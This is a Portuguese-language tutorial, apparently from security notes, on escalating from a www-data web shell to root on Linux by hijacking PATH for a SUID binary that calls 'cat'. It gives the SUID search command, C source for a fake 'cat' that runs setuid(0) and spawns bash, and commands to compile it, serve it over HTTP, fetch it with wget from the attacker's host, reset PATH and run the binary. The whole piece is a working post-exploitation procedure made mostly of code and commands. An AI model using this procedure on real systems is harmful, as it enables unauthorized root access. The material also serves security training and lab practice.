## Escalação de privilégios via binário SUID

Binários presentes no sistema, quando na situação de SUID, podem ser utilizados para escalar privilégios. Para isso, realize uma busca por esses binários:
```
find / -perm -4000 2>&-
```
Em seguida faça a consulta pelo nome do binário neste site: https://gtfobins.github.io/

Caso exista um binário específico (que não possa ser encontrado no repositório acima) é interessante realizar um disassembly para verificar se o mesmo, em algum momento da execução, executa outros binários do sistema. Veja o cenário abaixo:

<br>

**Considere um cenário de pós-exploração web após obter uma shell do usuário www-data (sem privilégios).**

<br>

É necessário buscar por binários SUID
```
find / -perm -4000 2>&-
```
![image](https://user-images.githubusercontent.com/76706456/180345179-c5a19806-54b8-48e8-a2fb-fb42267b07be.png)

Observe na imagem acima que há um binário chamado "script" em /arquivos

Ao executar, ele utiliza o cat para tentar abrir um arquivo inexistente no sistema
![image](https://user-images.githubusercontent.com/76706456/180345380-408e3c33-3ac8-43fb-88cd-7302a2d35706.png)

Neste caso, como o binário "script" é executado como root, ao executar o cat ele o faz com as mesmas permissões. Usaremos essa peculiaridade para escalar nosso privilégio.

Em sua máquina, crie o arquivo cat.c
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void main()
{
  setuid(0);
  setgid(0);
  system("/bin/bash");
}
```
Compile na mesma arquitetura do sistema alvo (**-m32** para sistemas 32 bits)
```
gcc -m32 cat.c -o cat
```
Será gerado um binário chamado **cat**, que chamaremos de cat "falso", uma vez que ele será executado no lugar do original.

Transfira o cat "falso" para o servidor. Podemos iniciar um web server na nossa máquina e baixar no servidor alvo (lembre-se de realizar a transferência em um diretório que o usuário www-data possua permissões de leitura/escrita)
```
python3 -m http.server 80
```
Faremos o download no diretório /tmp
```
cd /tmp;wget http://192.168.0.2/cat
```
Dê permissões ao cat "falso"
```
chmod 755 cat
```
Vamos ver qual é o PATH atual (diretório em que se encontram os binários do sistema)
```
echo $PATH
```
Vamos até o diretório em que se encontra o binário SUID
```
cd /arquivos
```
Vamos redefinir o caminho do PATH, apontando para o diretório em que foi realizado o wget do nosso cat "falso"
```
PATH="/tmp"
```
Agora execute o binário e observe que será obtido root (isso ocorre pois o binário SUID está executando como root o nosso cat "falso", que por sua vez spawna um novo bash)
```
./script
```
Redefina o PATH conforme visto anteriormente para conseguirmos utilizar todos os binários do sistema
```
PATH="/usr/local/bin:/usr/bin:/bin"
```

Observe que foi obtido root:

![image](https://user-images.githubusercontent.com/76706456/180348567-8bd50b1a-b5fe-47d4-81a4-f45aecc46623.png)
